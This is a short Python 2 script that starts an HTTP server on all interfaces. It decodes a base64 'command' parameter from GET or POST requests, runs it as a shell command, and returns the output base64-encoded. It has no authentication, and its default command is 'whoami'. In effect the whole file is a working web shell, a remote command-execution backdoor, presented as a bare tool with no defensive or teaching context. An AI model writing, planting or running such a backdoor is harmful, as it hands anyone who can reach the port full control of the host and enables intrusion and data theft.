#!/usr/bin/env python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os
import base64
import urlparse
import cgi

API_DEFAULTCOMMAND = 'whoami'

class RequestHandler(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header("Content-type", "text/html")
		self.end_headers()
	
	def _execute(self, query):
		if 'command' in query and len(query['command']) == 1:
			command = query['command'][0]
		else:
			command = base64.b64encode(API_DEFAULTCOMMAND)
		
		try:
			command = base64.b64decode(command)
			output = os.popen(command).read()
		except Exception,e:
			output = str(e)
		
		return base64.b64encode(output)
	
	def do_POST(self):
		self._set_headers()
		try:
			content_length = int(self.headers.getheader('content-length'))
			query = cgi.parse_qs(self.rfile.read(content_length), keep_blank_values=1)
			output = self._execute(query)
		except Exception,e:
			output = str(e)
		
		self.wfile.write(output)
		
	def do_GET(self):
		self._set_headers()
		try:
			query = urlparse.parse_qs(urlparse.urlparse(self.path).query)
			output = self._execute(query)
		except Exception,e:
			output = str(e)
		
		self.wfile.write(output)

def run(port=80):
	httpd = HTTPServer(('0.0.0.0', port), RequestHandler)
	httpd.serve_forever()

if __name__ == "__main__":
	from sys import argv
	
	if len(argv) == 2:
		run(port=int(argv[1]))
	else:
		run()
